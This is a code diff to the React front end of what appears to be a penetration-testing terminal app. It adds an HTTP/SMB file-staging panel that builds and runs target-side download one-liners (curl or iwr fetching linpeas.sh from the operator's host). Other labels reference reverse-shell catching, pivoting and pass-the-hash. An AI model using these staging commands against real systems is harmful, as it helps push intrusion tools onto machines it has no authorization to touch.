+                          if (api?.ListFileTransferServers) {
+                            void api.ListFileTransferServers().then((s) => setDashboardFileServers(s || [])).catch(() => {});
+                          }
+                          if (sidebarTransferDir.trim() && api?.ListHostedTransferFiles) {
+                            setSidebarTransferLoadingFiles(true);
+                            void api.ListHostedTransferFiles(sidebarTransferDir.trim())
+                              .then((files) => setSidebarTransferFiles(files || []))
+                              .catch(() => {})
+                              .finally(() => setSidebarTransferLoadingFiles(false));
+                          }
+                        }}
+                        title="Refresh running servers and folder listing"
+                      >
+                        Refresh
+                      </button>
+                    </div>
+
+                    {/* Staging Root Folder Input + Browse */}
+                    <div style={{ display: 'flex', gap: '0.28rem' }}>
+                      <input
+                        type="text"
+                        className="cyber-hud-input"
+                        aria-label="Sidebar Staging Directory"
+                        placeholder="/opt/tools or C:\Tools"
+                        value={sidebarTransferDir}
+                        onChange={(e) => setSidebarTransferDir(e.target.value)}
+                        onKeyDown={(e) => {
+                          if (e.key === 'Enter' && sidebarTransferDir.trim()) {
+                            const api = getWailsBindings();
+                            if (api?.ListHostedTransferFiles) {
+                              setSidebarTransferLoadingFiles(true);
+                              void api.ListHostedTransferFiles(sidebarTransferDir.trim())
+                                .then((files) => setSidebarTransferFiles(files || []))
+                                .catch((err: unknown) => setSidebarTransferError(err instanceof Error ? err.message : String(err)))
+                                .finally(() => setSidebarTransferLoadingFiles(false));
+                            }
+                          }
+                        }}
+                        style={{ flex: 1, minWidth: 0, fontSize: '0.7rem' }}
+                      />
+                      <button
+                        type="button"
+                        className="cyber-hud-btn btn-secondary btn-sm"
+                        style={{ padding: '0 0.45rem', flexShrink: 0 }}
+                        onClick={() => {
+                          void (async () => {
+                            const api = getWailsBindings();
+                            const selected = await api?.SelectDirectoryDialog?.('Select Staging Directory to Serve');
+                            if (selected && selected.trim()) {
+                              const clean = selected.trim();
+                              setSidebarTransferDir(clean);
+                              setSidebarTransferError('');
+                              if (api?.ListHostedTransferFiles) {
+                                setSidebarTransferLoadingFiles(true);
+                                try {
+                                  const files = await api.ListHostedTransferFiles(clean);
+                                  setSidebarTransferFiles(files || []);
+                                } catch (err: unknown) {
+                                  setSidebarTransferError(err instanceof Error ? err.message : String(err));
+                                } finally {
+                                  setSidebarTransferLoadingFiles(false);
+                                }
+                              }
+                            }
+                          })();
+                        }}
+                        title="Choose staging folder"
+                      >
+                        <CyberIcon name="folder" size={12} />
+                      </button>
+                    </div>
+
+                    {/* Engine Pills */}
+                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: '0.2rem' }}>
+                      {(
+                        [
+                          { id: 'builtin', label: 'HTTP' },
+                          { id: 'python3', label: 'Py3' },
+                          { id: 'updog', label: 'Updog' },
+                          { id: 'impacket-smb', label: 'SMB' },
+                          { id: 'php', label: 'PHP' },
+                        ] as { id: FileServerKind; label: string }[]
+                      ).map((eng) => (
+                        <button
+                          key={eng.id}
+                          type="button"
+                          className={`cyber-pill-btn ${sidebarTransferKind === eng.id ? 'active' : ''}`}
+                          style={{ padding: '0.2rem 0.2rem', fontSize: '0.62rem', textAlign: 'center' }}
+                          onClick={() => {
+                            setSidebarTransferKind(eng.id);
+                            if (eng.id === 'impacket-smb' && sidebarTransferPort === 8000) setSidebarTransferPort(445);
+                            else if (eng.id !== 'impacket-smb' && sidebarTransferPort === 445) setSidebarTransferPort(8000);
+                          }}
+                        >
+                          {eng.label}
+                        </button>
+                      ))}
+                    </div>
+
+                    {/* Bind & Port + Upload */}
+                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 72px', gap: '0.28rem' }}>
+                      <input
+                        type="text"
+                        className="cyber-hud-input"
+                        aria-label="Sidebar Staging Bind Address"
+                        placeholder="0.0.0.0"
+                        value={sidebarTransferBind}
+                        onChange={(e) => setSidebarTransferBind(e.target.value)}
+                      />
+                      <input
+                        type="number"
+                        className="cyber-hud-input"
+                        aria-label="Sidebar Staging Port"
+                        min={1}
+                        max={65535}
+                        value={sidebarTransferPort}
+                        onChange={(e) => setSidebarTransferPort(Number(e.target.value) || 8000)}
+                      />
+                    </div>
+
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '0.3rem', flexWrap: 'wrap' }}>
+                      <div style={{ display: 'flex', gap: '0.2rem' }}>
+                        {[80, 8000, 8080, 443].map((p) => (
+                          <button
+                            key={p}
+                            type="button"
+                            className={`cyber-pill-btn ${sidebarTransferPort === p ? 'active' : ''}`}
+                            style={{ fontSize: '0.6rem', padding: '1px 5px' }}
+                            onClick={() => setSidebarTransferPort(p)}
+                          >
+                            :{p}
+                          </button>
+                        ))}
+                      </div>
+                      <label style={{ display: 'inline-flex', alignItems: 'center', gap: '0.28rem', fontSize: '0.65rem', color: '#cbd5e1', cursor: 'pointer' }}>
+                        <input
+                          type="checkbox"
+                          checked={sidebarTransferUpload}
+                          onChange={(e) => setSidebarTransferUpload(e.target.checked)}
+                        />
+                        <span>/upload</span>
+                      </label>
+                    </div>
+
+                    {sidebarTransferError && (
+                      <div style={{ fontSize: '0.66rem', color: '#f87171', background: 'rgba(239,68,68,0.12)', border: '1px solid rgba(239,68,68,0.4)', padding: '3px 6px', borderRadius: 3 }}>
+                        {sidebarTransferError}
+                      </div>
+                    )}
+
+                    {sidebarTransferKind === 'builtin' ? (
+                      <button
+                        type="button"
+                        className="cyber-hud-btn btn-primary btn-sm"
+                        disabled={sidebarTransferBusy}
+                        style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '0.35rem', width: '100%' }}
+                        onClick={() => {
+                          void (async () => {
+                            const api = getWailsBindings();
+                            if (!api?.StartFileTransferServer) return;
+                            setSidebarTransferBusy(true);
+                            setSidebarTransferError('');
+                            try {
+                              const started = await api.StartFileTransferServer({
+                                id: '',
+                                name: `HTTP Staging :${sidebarTransferPort}`,
+                                kind: 'builtin',
+                                directory: sidebarTransferDir.trim() || '.',
+                                bindAddress: sidebarTransferBind.trim() || '0.0.0.0',
+                                port: Number(sidebarTransferPort) || 8000,
+                                enableUpload: sidebarTransferUpload,
+                                useTLS: false,
+                              });
+                              if (api.ListFileTransferServers) {
+                                const list = await api.ListFileTransferServers();
+                                setDashboardFileServers(list || []);
+                              }
+                              setStatusMessage(`Started staging server on ${started.bindAddress}:${started.port}.`);
+                            } catch (err: unknown) {
+                              setSidebarTransferError(err instanceof Error ? err.message : String(err));
+                            } finally {
+                              setSidebarTransferBusy(false);
+                            }
+                          })();
+                        }}
+                      >
+                        <CyberIcon name="play" size={12} />
+                        <span>{sidebarTransferBusy ? 'Starting...' : `Start HTTP Server (:${sidebarTransferPort})`}</span>
+                      </button>
+                    ) : (
+                      <div style={{ display: 'flex', gap: '0.3rem' }}>
+                        <button
+                          type="button"
+                          className="cyber-hud-btn btn-secondary btn-sm"
+                          style={{ flex: 1, fontSize: '0.66rem', justifyContent: 'center' }}
+                          onClick={() => {
+                            if (sidebarTransferExtCmd && navigator.clipboard?.writeText) {
+                              void navigator.clipboard.writeText(sidebarTransferExtCmd);
+                              setStatusMessage('Copied server command to clipboard.');
+                            }
+                          }}
+                        >
+                          <CyberIcon name="copy" size={11} />
+                          <span>Copy Cmd</span>
+                        </button>
+                        <button
+                          type="button"
+                          className="cyber-hud-btn btn-primary btn-sm"
+                          style={{ flex: 1, fontSize: '0.66rem', justifyContent: 'center' }}
+                          onClick={() => {
+                            const api = getWailsBindings();
+                            if (api?.OpenLocalTerminal && sidebarTransferExtCmd) {
+                              void api.OpenLocalTerminal('powershell', { cols: 120, rows: 34 }).then((sid) => {
+                                openSessionTab(sid, 'File Staging Server', undefined, '#10b981');
+                                setTimeout(() => {
+                                  void api.WriteTerminal?.(sid, `${sidebarTransferExtCmd}\n`);
+                                }, 400);
+                              });
+                            }
+                          }}
+                        >
+                          <CyberIcon name="terminal" size={11} />
+                          <span>Run Local</span>
+                        </button>
+                      </div>
+                    )}
+
+                    {/* Active Running Staging Servers Monitor */}
+                    {dashboardFileServers.length > 0 && (
+                      <div style={{ display: 'flex', flexDirection: 'column', gap: '0.28rem', marginTop: '0.1rem' }}>
+                        {dashboardFileServers.map((srv) => (
+                          <div
+                            key={srv.id}
+                            style={{
+                              background: 'rgba(16, 185, 129, 0.1)',
+                              border: '1px solid rgba(16, 185, 129, 0.38)',
+                              borderRadius: '3px',
+                              padding: '4px 6px',
+                              fontSize: '0.66rem',
+                              color: '#6ee7b7',
+                              display: 'flex',
+                              flexDirection: 'column',
+                              gap: '2px',
+                            }}
+                          >
+                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '4px' }}>
+                              <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', fontWeight: 700 }}>
+                                :{srv.port} · GET {srv.servedCount} · UP {srv.uploadCount}
+                              </span>
+                              <button
+                                type="button"
+                                className="drawer-action-btn"
+                                style={{ color: '#f87171', padding: '1px 5px', fontSize: '0.62rem' }}
+                                onClick={() => {
+                                  void getWailsBindings()?.StopFileTransferServer?.(srv.id).then(() => {
+                                    void getWailsBindings()?.ListFileTransferServers?.().then((s) => setDashboardFileServers(s || []));
+                                  });
+                                }}
+                              >
+                                Stop
+                              </button>
+                            </div>
+                            <div style={{ fontSize: '0.61rem', color: '#94a3b8', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                              {srv.directory}
+                            </div>
+                            {srv.recentEvents && srv.recentEvents.length > 0 && (
+                              <div style={{ fontFamily: 'monospace', fontSize: '0.6rem', color: '#cbd5e1', background: 'rgba(2, 6, 23, 0.65)', padding: '2px 4px', borderRadius: 2 }}>
+                                {srv.recentEvents.slice(-2).reverse().map((ev, i) => (
+                                  <div key={i} style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                                    [{ev.status}] {ev.method} {ev.path}
+                                  </div>
+                                ))}
+                              </div>
+                            )}
+                          </div>
+                        ))}
+                      </div>
+                    )}
+                  </div>
+
+                  {/* MIDDLE: Folder & File Picker */}
+                  <div
+                    style={{
+                      padding: '0.55rem 0.75rem',
+                      borderBottom: '1px solid rgba(0, 240, 255, 0.16)',
+                      display: 'flex',
+                      flexDirection: 'column',
+                      gap: '0.35rem',
+                      flex: 1,
+                      minHeight: 0,
+                      overflow: 'hidden',
+                    }}
+                  >
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                      <span style={{ fontSize: '0.67rem', fontWeight: 700, color: '#38bdf8', letterSpacing: '0.07em' }}>
+                        FILES &amp; FOLDERS ({sidebarTransferFiles.length})
+                      </span>
+                      <button
+                        type="button"
+                        className="drawer-action-btn"
+                        style={{ padding: '1px 6px', fontSize: '0.62rem' }}
+                        disabled={!sidebarTransferDir || sidebarTransferDir === '/' || /^[A-Za-z]:[\\/]?$/.test(sidebarTransferDir)}
+                        onClick={() => {
+                          const trimmed = sidebarTransferDir.replace(/[\\/]+$/, '');
+                          const sepIdx = Math.max(trimmed.lastIndexOf('/'), trimmed.lastIndexOf('\\'));
+                          if (sepIdx <= 0) return;
+                          let parent = trimmed.slice(0, sepIdx);
+                          if (/^[A-Za-z]:$/.test(parent)) parent += '\\';
+                          setSidebarTransferDir(parent);
+                          const api = getWailsBindings();
+                          if (api?.ListHostedTransferFiles) {
+                            setSidebarTransferLoadingFiles(true);
+                            void api.ListHostedTransferFiles(parent)
+                              .then((files) => setSidebarTransferFiles(files || []))
+                              .catch(() => {})
+                              .finally(() => setSidebarTransferLoadingFiles(false));
+                          }
+                        }}
+                        title="Go to parent folder"
+                      >
+                        .. Up
+                      </button>
+                    </div>
+
+                    <div style={{ flex: 1, minHeight: 0, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '0.24rem' }}>
+                      {sidebarTransferLoadingFiles ? (
+                        <div style={{ fontSize: '0.68rem', color: '#94a3b8' }}>Loading folder...</div>
+                      ) : sidebarTransferFiles.length === 0 ? (
+                        <div style={{ fontSize: '0.68rem', color: '#64748b' }}>Empty folder or type custom filename below.</div>
+                      ) : (
+                        sidebarTransferFiles.map((f) => {
+                          const fileKey = f.relPath || f.name;
+                          const isSelected = !f.isDir && sidebarTransferSelectedFile === fileKey;
+                          return (
+                            <button
+                              key={fileKey}
+                              type="button"
+                              onClick={() => {
+                                if (f.isDir) {
+                                  const nextDir = f.fullPath || `${sidebarTransferDir.replace(/[\\/]+$/, '')}/${f.name}`;
+                                  setSidebarTransferDir(nextDir);
+                                  const api = getWailsBindings();
+                                  if (api?.ListHostedTransferFiles) {
+                                    setSidebarTransferLoadingFiles(true);
+                                    void api.ListHostedTransferFiles(nextDir)
+                                      .then((files) => setSidebarTransferFiles(files || []))
+                                      .catch(() => {})
+                                      .finally(() => setSidebarTransferLoadingFiles(false));
+                                  }
+                                } else {
+                                  setSidebarTransferSelectedFile(fileKey);
+                                  const api = getWailsBindings();
+                                  if (api?.HashHostedTransferFile) {
+                                    void api.HashHostedTransferFile(sidebarTransferDir, fileKey).then((hashed) => {
+                                      setSidebarTransferSelectedHashes({
+                                        filename: hashed.relPath || hashed.name,
+                                        sha256: hashed.sha256 || '',
+                                        md5: hashed.md5 || '',
+                                        size: hashed.size,
+                                      });
+                                    }).catch(() => {});
+                                  }
+                                }
+                              }}
+                              style={{
+                                display: 'flex',
+                                justifyContent: 'space-between',
+                                alignItems: 'center',
+                                width: '100%',
+                                textAlign: 'left',
+                                padding: '4px 6px',
+                                borderRadius: '3px',
+                                cursor: 'pointer',
+                                background: isSelected ? 'rgba(0, 240, 255, 0.16)' : 'rgba(15, 23, 42, 0.6)',
+                                border: isSelected ? '1px solid rgba(0, 240, 255, 0.65)' : '1px solid rgba(148, 163, 184, 0.16)',
+                                color: f.isDir ? '#38bdf8' : '#e2e8f0',
+                                fontSize: '0.69rem',
+                                fontFamily: 'JetBrains Mono, monospace',
+                              }}
+                            >
+                              <span style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', minWidth: 0, overflow: 'hidden' }}>
+                                <CyberIcon name={f.isDir ? 'folder' : 'file'} size={12} />
+                                <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{f.name}</span>
+                              </span>
+                              <span style={{ fontSize: '0.61rem', color: '#94a3b8', flexShrink: 0, marginLeft: '4px' }}>
+                                {f.isDir ? 'DIR' : f.size < 1024 ? `${f.size}B` : `${(f.size / 1024).toFixed(1)}K`}
+                              </span>
+                            </button>
+                          );
+                        })
+                      )}
+                    </div>
+                  </div>
+
+                  {/* BOTTOM: Quick Target One-Liner */}
+                  <div style={{ padding: '0.55rem 0.75rem', display: 'flex', flexDirection: 'column', gap: '0.35rem', flexShrink: 0 }}>
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                      <span style={{ fontSize: '0.66rem', fontWeight: 700, color: '#34d399', letterSpacing: '0.07em' }}>
+                        QUICK DOWNLOAD CMD
+                      </span>
+                      <div style={{ display: 'flex', gap: '0.2rem' }}>
+                        {(['linux', 'windows'] as const).map((os) => (
+                          <button
+                            key={os}
+                            type="button"
+                            className={`cyber-pill-btn ${sidebarTransferTargetOs === os ? 'active' : ''}`}
+                            style={{ padding: '1px 6px', fontSize: '0.62rem' }}
+                            onClick={() => setSidebarTransferTargetOs(os)}
+                          >
+                            {os === 'linux' ? 'Linux' : 'Windows'}
+                          </button>
+                        ))}
+                      </div>
+                    </div>
+
+                    {sidebarTransferLocalIPs.length > 0 && (
+                      <div style={{ display: 'flex', gap: '0.2rem', flexWrap: 'wrap' }}>
+                        {sidebarTransferLocalIPs.slice(0, 3).map((ipItem) => (
+                          <button
+                            key={`${ipItem.interface}-${ipItem.ip}`}
+                            type="button"
+                            className={`cyber-pill-btn ${sidebarTransferLhost === ipItem.ip ? 'active' : ''}`}
+                            style={{ fontSize: '0.6rem', padding: '1px 5px' }}
+                            onClick={() => setSidebarTransferLhost(ipItem.ip)}
+                          >
+                            {ipItem.isVpn ? ipItem.interface : ipItem.ip}
+                          </button>
+                        ))}
+                      </div>
+                    )}
+
+                    <input
+                      type="text"
+                      className="cyber-hud-input"
+                      aria-label="Sidebar Staged Filename"
+                      value={sidebarTransferSelectedFile}
+                      onChange={(e) => setSidebarTransferSelectedFile(e.target.value)}
+                      placeholder="linpeas.sh"
+                      style={{ fontSize: '0.68rem' }}
+                    />
+
+                    {(() => {
+                      const fallbackCmd =
+                        sidebarTransferTargetOs === 'windows'
+                          ? `iwr -Uri http://${sidebarTransferLhost}:${sidebarTransferPort}/${sidebarTransferSelectedFile || 'linpeas.sh'} -OutFile ${sidebarTransferSelectedFile || 'linpeas.sh'}`
+                          : `curl -O http://${sidebarTransferLhost}:${sidebarTransferPort}/${sidebarTransferSelectedFile || 'linpeas.sh'}`;
+                      const pickedMethod =
+                        sidebarTransferCmdSet?.methods?.find((m) => m.category === 'download') ||
+                        sidebarTransferCmdSet?.methods?.[0];
+                      const cmd = pickedMethod?.command || fallbackCmd;
+                      return (
+                        <div className="drawer-card" style={{ padding: '0.45rem' }}>
+                          <pre
+                            style={{
+                              margin: '0 0 0.4rem 0',
+                              fontSize: '0.66rem',
+                              fontFamily: 'JetBrains Mono, monospace',
+                              color: '#00f0ff',
+                              whiteSpace: 'pre-wrap',
+                              wordBreak: 'break-all',
+                              background: 'rgba(2, 6, 23, 0.75)',
+                              padding: '0.35rem',
+                              border: '1px solid rgba(0, 240, 255, 0.18)',
+                              maxHeight: '58px',
+                              overflowY: 'auto',
+                            }}
+                          >
+                            {cmd}
+                          </pre>
+                          <div className="drawer-card-actions">
+                            <button
+                              type="button"
+                              className="drawer-action-btn"
+                              onClick={() => {
+                                if (cmd && navigator.clipboard?.writeText) {
+                                  void navigator.clipboard.writeText(cmd);
+                                  setStatusMessage('Copied download command to clipboard.');
+                                }
+                              }}
+                            >
+                              <CyberIcon name="copy" size={11} />
+                              <span>Copy</span>
+                            </button>
+                            <button
+                              type="button"
+                              className="drawer-action-btn"
+                              disabled={!sessionId}
+                              onClick={() => {
+                                if (sessionId && cmd) void getWailsBindings()?.WriteTerminal?.(sessionId, cmd);
+                              }}
+                            >
+                              <CyberIcon name="terminal" size={11} />
+                              <span>Insert</span>
+                            </button>
+                            <button
+                              type="button"
+                              className="drawer-action-btn run-btn"
+                              disabled={!sessionId}
+                              onClick={() => {
+                                if (sessionId && cmd) void getWailsBindings()?.WriteTerminal?.(sessionId, `${cmd}\n`);
+                              }}
+                            >
+                              <CyberIcon name="play" size={11} />
+                              <span>Run</span>
+                            </button>
+                          </div>
+                        </div>
+                      );
+                    })()}
+                  </div>
+                </div>
+              )}
+
               {activeSidebarPanel === 'listeners' && (
                 <div className="drawer-panel drawer-listeners-panel">
                   <div className="sidebar-header">
@@ -10215,8 +10982,8 @@ export function App({
                       <button
                         type="button"
                         className="btn-secondary btn-sm"
-                        onClick={() => setShowRouteHealthModal(true)}
-                        title="Open Unified Listeners & Route Health Dashboard (F-38)"
+                        onClick={openRouteHealthTab}
+                        title="Open Unified Listeners & Route Health Dashboard View"
                       >
                         Dashboard
                       </button>
@@ -10224,7 +10991,7 @@ export function App({
                         type="button"
                         className="btn-primary btn-sm"
                         onClick={() => setShowListenerManagerModal(true)}
-                        title="Open Unified Listener Manager (F-32)"
+                        title="Open Unified Listener Manager"
                       >
                         + Listeners
                       </button>
@@ -10273,7 +11040,7 @@ export function App({
                                       rows: 24,
                                     });
                                   }}
-                                  title="Stabilize caught shell (F-34)"
+                                  title="Stabilize caught shell"
                                 >
                                   <CyberIcon name="stabilize" size={12} />
                                   <span>Stabilize ({sess.id.slice(0, 8)})</span>
@@ -10380,7 +11147,7 @@ export function App({
                         type="button"
                         className="btn-primary btn-sm"
                         onClick={() => setShowTotpModal(true)}
-                        title="Open 2FA Authenticator Vault (F-20)"
+                        title="Open 2FA Authenticator Vault"
                       >
                         + 2FA Vault
                       </button>
@@ -10539,7 +11306,7 @@ export function App({
                         type="button"
                         className="btn-primary btn-sm"
                         onClick={() => setShowCredStoreModal(true)}
-                        title="Open Credential Pool Modal (F-36)"
+                        title="Open Credential Pool Modal"
                       >
                         + Pool
                       </button>
@@ -10914,6 +11681,7 @@ export function App({
               activeTab.tabType !== 'settings' &&
               activeTab.tabType !== 'sftp' &&
               activeTab.tabType !== 'network-map' &&
+              activeTab.tabType !== 'route-health' &&
               activeTab.tabType !== 'editor' && (
               <div className="terminal-toolbar hud-command-strip">
                 <div className="hud-telemetry-readout" title={statusMessage}>
@@ -11252,10 +12020,10 @@ export function App({
                     <button
                       type="button"
                       className="hud-seg-btn"
-                      aria-label="Stabilize Shell (F-34)"
+                      aria-label="Stabilize Shell"
                       onMouseDown={(e) => e.preventDefault()}
                       onClick={handleOpenShellStabilize}
-                      title="Upgrade raw/dumb shell to a full interactive PTY terminal (F-34)"
+                      title="Upgrade raw/dumb shell to a full interactive PTY terminal"
                     >
                       <CyberIcon name="stabilize" size={12} />
                       <span>Stabilize</span>
@@ -11356,6 +12124,112 @@ export function App({
                       />
                     ) : tab.tabType === 'winrm' ? (
                       renderWinrmManager(true, () => void handleCloseTab(tab.id), tab.id)
+                    ) : tab.tabType === 'route-health' ? (
+                      <RouteHealthModal
+                        isView={true}
+                        onClose={() => void handleCloseTab(tab.id)}
+                        activeEngagementId={activeEngagement?.id || null}
+                        activeEngagementName={activeEngagement?.name || null}
+                        socksCandidates={(() => {
+                          const list: SocksCandidateOption[] = [];
+                          for (const tun of activeTunnels) {
+                            if (tun.type === 'D' && tun.status === 'active') {
+                              const host =
+                                !tun.bindAddress || tun.bindAddress === '0.0.0.0' || tun.bindAddress === '::'
+                                  ? '127.0.0.1'
+                                  : tun.bindAddress;
+                              list.push({ label: `SSH -D`, addr: `${host}:${tun.bindPort}` });
+                            }
+                          }
+                          for (const p of vaultSummary.proxyProfiles || []) {
+                            if (p.type === 'socks5' && p.socksAddress) {
+                              if (!list.some((x) => x.addr === p.socksAddress)) {
+                                list.push({ label: p.name, addr: p.socksAddress });
+                              }
+                            }
+                          }
+                          return list;
+                        })()}
+                        suggestedTargetHosts={vaultSummary.hosts.map((h) => h.address).filter(Boolean)}
+                        activeDashboardItems={(() => {
+                          const items: DashboardListenerSnapshot[] = [];
+                          for (const l of drawerListeners) {
+                            items.push({
+                              id: l.id,
+                              sourceType: 'shell-listener',
+                              name: l.name,
+                              kind: `${l.tool} (${l.kind})`,
+                              endpoint: `${l.bindAddress}:${l.bindPort}`,
+                              status: l.status,
+                              metaSummary: `Catches: ${l.catchCount || 0}`,
+                            });
+                          }
+                          for (const srv of dashboardFileServers) {
+                            items.push({
+                              id: srv.id,
+                              sourceType: 'transfer-server',
+                              name: srv.name,
+                              kind: srv.kind,
+                              endpoint: `${srv.bindAddress}:${srv.port}`,
+                              status: srv.status,
+                              metaSummary: `Served: ${srv.servedCount || 0} · Uploads: ${srv.uploadCount || 0}`,
+                            });
+                          }
+                          for (const p of drawerPivots) {
+                            if (p.status === 'running') {
+                              items.push({
+                                id: p.id,
+                                sourceType: 'pivot',
+                                name: p.name,
+                                kind: p.tool,
+                                endpoint: p.listenPort ? `${p.bindAddress}:${p.listenPort}` : p.tool,
+                                status: p.status,
+                              });
+                            }
+                          }
+                          for (const t of activeTunnels) {
+                            if (t.status === 'active') {
+                              items.push({
+                                id: t.id,
+                                sourceType: 'ssh-tunnel',
+                                name: `SSH -${t.type} :${t.bindPort}`,
+                                kind: `-${t.type}`,
+                                endpoint: `${t.bindAddress || '127.0.0.1'}:${t.bindPort}`,
+                                status: t.status,
+                              });
+                            }
+                          }
+                          return items;
+                        })()}
+                        onRefreshEndpoints={refreshRouteHealthEndpoints}
+                        onStopEndpoint={async (sourceType, id) => {
+                          const api = getWailsBindings();
+                          if (!api) return;
+                          if (sourceType === 'shell-listener' && api.StopManagedListener) {
+                            await api.StopManagedListener(id);
+                            setDrawerListeners((prev) => prev.filter((x) => x.id !== id));
+                          } else if (sourceType === 'transfer-server' && api.StopFileTransferServer) {
+                            await api.StopFileTransferServer(id);
+                            setDashboardFileServers((prev) => prev.filter((x) => x.id !== id));
+                          } else if (sourceType === 'pivot' && api.StopPivotInstance) {
+                            await api.StopPivotInstance(id);
+                            setDrawerPivots((prev) => prev.filter((x) => x.id !== id));
+                          } else if (sourceType === 'ssh-tunnel' && api.StopForwardTunnel) {
+                            await api.StopForwardTunnel(id);
+                            if (api.GetActiveTunnels) {
+                              const tuns = await api.GetActiveTunnels();
+                              setActiveTunnels(tuns || []);
+                            }
+                          }
+                        }}
+                        runHealthCheck={async (req) => {
+                          const api = getWailsBindings();
+                          if (api?.RunRouteHealthCheck) return api.RunRouteHealthCheck(req);
+                          throw new Error('RunRouteHealthCheck API unavailable');
+                        }}
+                        onOpenPivotManager={() => setShowPivotManagerModal(true)}
+                        onOpenPortForwarding={() => setShowPortForwardingModal(true)}
+                      />
                     ) : tab.tabType === 'network-map' ? (
                       <NetworkMapView
                         hosts={vaultSummary.hosts}
@@ -11753,7 +12627,7 @@ export function App({
                     }}
                   >
                     <div className="palette-item-main">
-                      <strong>🌐 Network Topology Map (F-37)</strong>
+                      <strong>🌐 Network Topology Map</strong>
                       <span>Interactive network graph &amp; jump chain visualizer</span>
                     </div>
                     <div className="palette-tags">
@@ -11786,7 +12660,7 @@ export function App({
                     }}
                   >
                     <div className="palette-item-main">
-                      <strong>⚡ Raw TCP Socket &amp; Listener (F-31)</strong>
+                      <strong>⚡ Raw TCP Socket &amp; Listener</strong>
                       <span>Direct Netcat outgoing client or inbound reverse shell catcher</span>
                     </div>
                     <div className="palette-tags">
@@ -11825,7 +12699,7 @@ export function App({
                     <div className="palette-item-main">
                       <strong style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                         <CyberIcon name="upload" size={14} />
-                        <span>File Transfer Helper // HTTP Staging (F-31)</span>
+                        <span>File Transfer Helper // HTTP Staging</span>
                       </strong>
                       <span>HTTP/SMB staging server, target download one-liners &amp; SHA-256/MD5 verifier</span>
                     </div>
@@ -11845,8 +12719,7 @@ export function App({
                   'chisel'.includes(q) ||
                   'tunnel'.includes(q) ||
                   'socks'.includes(q) ||
-                  'route'.includes(q) ||
-                  'f-24'.includes(q);
+                  'route'.includes(q);
                 if (!showPivot) return null;
                 return (
                   <button
@@ -11861,7 +12734,7 @@ export function App({
                     <div className="palette-item-main">
                       <strong style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                         <CyberIcon name="tunnel" size={14} />
-                        <span>Pivoting Engine // ligolo-ng &amp; chisel (F-24)</span>
+                        <span>Pivoting Engine // ligolo-ng &amp; chisel</span>
                       </strong>
                       <span>Start/stop ligolo-ng TUN or chisel reverse SOCKS5 pivots, routes &amp; agent one-liners</span>
                     </div>
@@ -11879,8 +12752,7 @@ export function App({
                   'route'.includes(q) ||
                   'probe'.includes(q) ||
                   'opsec'.includes(q) ||
-                  'socks'.includes(q) ||
-                  'f-38'.includes(q);
+                  'socks'.includes(q);
                 if (!showHealth) return null;
                 return (
                   <button
@@ -11889,13 +12761,13 @@ export function App({
                     onClick={() => {
                       setShowCommandPalette(false);
                       setPaletteQuery('');
-                      setShowRouteHealthModal(true);
+                      openRouteHealthTab();
                     }}
                   >
                     <div className="palette-item-main">
                       <strong style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                         <CyberIcon name="shield" size={14} />
-                        <span>Route Health Check // Throttled OPSEC (F-38)</span>
+                        <span>Route Health Check Dashboard</span>
                       </strong>
                       <span>On-demand throttled TCP connect probes, SOCKS5 checks &amp; ligolo session status</span>
                     </div>
@@ -11915,8 +12787,7 @@ export function App({
                   'evil-winrm'.includes(q) ||
                   'remoting'.includes(q) ||
                   'ntlm'.includes(q) ||
-                  'pth'.includes(q) ||
-                  'f-41'.includes(q);
+                  'pth'.includes(q);
                 if (!showWinrm) return null;
                 return (
                   <button
@@ -11931,7 +12802,7 @@ export function App({
                     <div className="palette-item-main">
                       <strong style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                         <CyberIcon name="terminal" size={14} />
-                        <span>WinRM // PowerShell Remoting Client (F-41)</span>
+                        <span>WinRM // PowerShell Remoting Client</span>
                       </strong>
                       <span>HTTP 5985 / HTTPS 5986 interactive Evil-WinRM parity shell, PtH &amp; file transfer</span>
                     </div>
@@ -12064,7 +12935,7 @@ export function App({
                     {editingHostId ? '⚙️ Edit SSH Host' : '➕ New SSH Host'}
                   </h3>
                   <div style={{ fontSize: '0.7rem', color: '#38bdf8', fontFamily: 'JetBrains Mono, Consolas, monospace', marginTop: '2px', letterSpacing: '0.04em' }}>
-                    VAULT-TARGET // SECURE HOST CONFIGURATION (F-01)
+                    VAULT-TARGET // SECURE HOST CONFIGURATION
                   </div>
                 </div>
               </div>
@@ -14271,114 +15142,11 @@ export function App({
             if (api?.GetLocalNetworkIPs) return api.GetLocalNetworkIPs();
             return [];
           }}
-          onOpenRouteHealth={() => setShowRouteHealthModal(true)}
+          onOpenRouteHealth={() => {
+            setShowPivotManagerModal(false);
+            openRouteHealthTab();
+          }}
           onSelectBinaryFile={(t) => getWailsBindings()?.SelectFileDialog?.(t, '', '') ?? Promise.resolve('')}
-        />
-      )}
-
-      {showRouteHealthModal && (
-        <RouteHealthModal
-          onClose={() => setShowRouteHealthModal(false)}
-          activeEngagementId={activeEngagement?.id || null}
-          activeEngagementName={activeEngagement?.name || null}
-          socksCandidates={(() => {
-            const list: SocksCandidateOption[] = [];
-            for (const tun of activeTunnels) {
-              if (tun.type === 'D' && tun.status === 'active') {
-                const host =
-                  !tun.bindAddress || tun.bindAddress === '0.0.0.0' || tun.bindAddress === '::'
-                    ? '127.0.0.1'
-                    : tun.bindAddress;
-                list.push({ label: `SSH -D`, addr: `${host}:${tun.bindPort}` });
-              }
-            }
